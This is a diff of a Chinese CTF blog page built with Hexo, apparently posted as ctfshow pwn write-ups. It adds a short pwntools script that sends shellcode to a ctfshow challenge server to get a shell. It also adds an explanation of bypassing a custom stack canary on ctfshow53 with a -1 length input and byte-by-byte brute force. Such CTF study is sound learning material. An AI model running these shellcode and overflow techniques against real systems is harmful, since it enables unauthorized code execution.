+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28112</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">payload = shellcode</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://example.com/2025/01/25/Canary%E7%88%86%E7%A0%B4/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -208,7 +407,7 @@
               <span class="post-meta-item-text">发表于</span>
               
 
-              <time title="创建时间：2025-01-25 21:28:17 / 修改时间：22:56:38" itemprop="dateCreated datePublished" datetime="2025-01-25T21:28:17+08:00">2025-01-25</time>
+              <time title="创建时间：2025-01-25 21:28:17 / 修改时间：23:09:00" itemprop="dateCreated datePublished" datetime="2025-01-25T21:28:17+08:00">2025-01-25</time>
             </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -248,14 +447,14 @@
           <h1 id="ctfshow53"><a href="#ctfshow53" class="headerlink" title="ctfshow53"></a>ctfshow53</h1><h2 id="（1）checksec"><a href="#（1）checksec" class="headerlink" title="（1）checksec"></a>（1）checksec</h2><p><img src="/2025/01/25/Canary%E7%88%86%E7%A0%B4/image-20250125213308165.png" alt="image-20250125213308165"></p>
 <p>发现并没有开canary保护，其实这道题只是在栈上放了一个作用与canary类似的，程序运行过程中也会比较它的值是否改变</p>
 <p>思路：我们可以逐字节的将canary爆破出来</p>
-<h2 id="（2）ida查看"><a href="#（2）ida查看" class="headerlink" title="（2）ida查看"></a>（2）ida查看</h2><p><img src="/2025/01/25/Canary%E7%88%86%E7%A0%B4/image-20250125213837949.png" alt="image-20250125213837949"></p>
+<h2 id="（2）ida代码审计"><a href="#（2）ida代码审计" class="headerlink" title="（2）ida代码审计"></a>（2）ida代码审计</h2><p><img src="/2025/01/25/Canary%E7%88%86%E7%A0%B4/image-20250125213837949.png" alt="image-20250125213837949"></p>
 <p><strong>看看Canary</strong></p>
 <p><img src="/2025/01/25/Canary%E7%88%86%E7%A0%B4/image-20250125213943366.png" alt="image-20250125213943366"></p>
 <p>意思就是先声明了一个指针变量  stream，打开canary.txt文件，如果没有这个文件就退出，如果有使用  fread 函数从打开的文件中读取 4 个字节的数据存储在全局变量global_canary</p>
 <p><strong>看看ctfshow</strong></p>
 <p><img src="/2025/01/25/Canary%E7%88%86%E7%A0%B4/image-20250125214349626.png" alt="image-20250125214349626"></p>
 <p>  将global_canary赋给s1，然后是一个while循环， 使用read函数读取字符到v2中，直至遇到换行符 \n（ASCII码为10）停止，v5记录存储的个数，每当存储一次v5的值就+1，，然后使用  __isoc99_sscanf 函数将  v2 中的字符串转换为整数，并存储到  nbytes 中，nbytes为<code>size_t</code> 类型无符号型，当我们输入-1时候就会被解释为一个非常大的数（（通常是 <code>0xFFFFFFFF</code>，即 <code>size_t</code> 类型的最大值）），所以我们可以输入-1来绕过while循环，并且可以利用第二个read进行栈溢出</p>
-<p>最后if循环就是比较canary的值是否改变的，将s1的值与global_canary比较如果不一样输出””Error *** Stack Smashing Detected *** : Canary Value Incorrect!”并退出，一样的话输出”Where is the flag?”</p>
+<p>最后if循环就是比较canary的值是否改变的，将s1的值与global_canary比较如果不一样输出”Error *** Stack Smashing Detected *** : Canary Value Incorrect!”并且退出，一样的话输出”Where is the flag?”</p>
 <p><strong>最后flag</strong></p>
 <p><img src="/2025/01/25/Canary%E7%88%86%E7%A0%B4/image-20250125220303086.png" alt="image-20250125220303086"></p>
 <p>意思就是打开flag的文件，通过puts函数将flag的值输出</p>
@@ -319,7 +518,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2025-01-25 22:59:19" itemprop="dateModified" datetime="2025-01-25T22:59:19+08:00">2025-01-25</time>
+                <time title="修改时间：2025-01-25 23:07:20" itemprop="dateModified" datetime="2025-01-25T23:07:20+08:00">2025-01-25</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -463,7 +662,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2025-01-25 22:55:37" itemprop="dateModified" datetime="2025-01-25T22:55:37+08:00">2025-01-25</time>
+                <time title="修改时间：2025-01-25 23:08:54" itemprop="dateModified" datetime="2025-01-25T23:08:54+08:00">2025-01-25</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -583,7 +782,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2025-01-25 22:53:56" itemprop="dateModified" datetime="2025-01-25T22:53:56+08:00">2025-01-25</time>
+                <time title="修改时间：2025-01-31 00:21:32" itemprop="dateModified" datetime="2025-01-31T00:21:32+08:00">2025-01-31</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -718,7 +917,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2025-01-25 22:57:55" itemprop="dateModified" datetime="2025-01-25T22:57:55+08:00">2025-01-25</time>
+                <time title="修改时间：2025-01-25 23:07:14" itemprop="dateModified" datetime="2025-01-25T23:07:14+08:00">2025-01-25</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -877,7 +1076,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2025-01-25 22:56:13" itemprop="dateModified" datetime="2025-01-25T22:56:13+08:00">2025-01-25</time>
+                <time title="修改时间：2025-01-25 23:08:48" itemprop="dateModified" datetime="2025-01-25T23:08:48+08:00">2025-01-25</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -1007,7 +1206,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2025-01-25 22:53:48" itemprop="dateModified" datetime="2025-01-25T22:53:48+08:00">2025-01-25</time>
+                <time title="修改时间：2025-01-26 20:35:14" itemprop="dateModified" datetime="2025-01-26T20:35:14+08:00">2025-01-26</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -1477,14 +1676,14 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">8</span>
+          <span class="site-state-item-count">9</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
           
-        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-count">3</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
@@ -1527,13 +1726,13 @@
       <i class="fa fa-chart-area"></i>
     </span>
       <span class="post-meta-item-text">站点总字数：</span>
-    <span title="站点总字数">16k</span>
+    <span title="站点总字数">23k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
       <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
-    <span title="站点阅读时长">14 分钟</span>
+    <span title="站点阅读时长">21 分钟</span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
   </div>
